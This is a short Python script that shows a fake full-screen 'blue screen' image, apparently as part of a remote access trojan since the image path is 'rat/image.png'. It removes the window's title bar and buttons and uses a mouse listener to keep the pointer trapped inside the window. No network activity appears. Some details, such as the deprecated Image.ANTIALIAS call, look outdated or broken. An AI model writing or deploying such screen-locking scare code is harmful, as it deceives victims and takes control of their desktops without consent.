import tkinter as tk
from PIL import Image, ImageTk
from pynput.mouse import Controller, Listener



def bsod():
  # Create a root window
  root = tk.Tk()
  
  # Make the window full-screen and remove title bar and buttons
  root.attributes('-fullscreen', True)  # Full-screen mode
  root.configure(bg='black')  # Set background to black (optional)
  root.overrideredirect(True)  # Remove window title and buttons
  
  # Function to lock the mouse inside the window
  def on_move(x, y):
      # Lock the mouse inside the window by restricting its movement to the window bounds
      window_width = root.winfo_width()
      window_height = root.winfo_height()
      
      if x < 0 or x > window_width or y < 0 or y > window_height:
          # Move the mouse back to the center of the window if it's out of bounds
          controller.position = (window_width // 2, window_height // 2)
  
  # Load and resize the image to fit the screen
  def load_image():
      screen_width = root.winfo_screenwidth()
      screen_height = root.winfo_screenheight()
  
      # Open the image and resize it based on screen dimensions
      image = Image.open("rat/image.png")  # Replace with your image file path
      image = image.resize((screen_width, screen_height), Image.ANTIALIAS)
      photo = ImageTk.PhotoImage(image)
  
      # Create a label to hold the image
      label = tk.Label(root, image=photo)
      label.photo = photo  # Keep a reference to the image object to prevent garbage collection
      label.pack(fill=tk.BOTH, expand=True)  # Make the image scale to full screen
  
  
  controller = Controller()
  listener = Listener(on_move=on_move)
  listener.start()
  
  load_image()
  root.mainloop()
  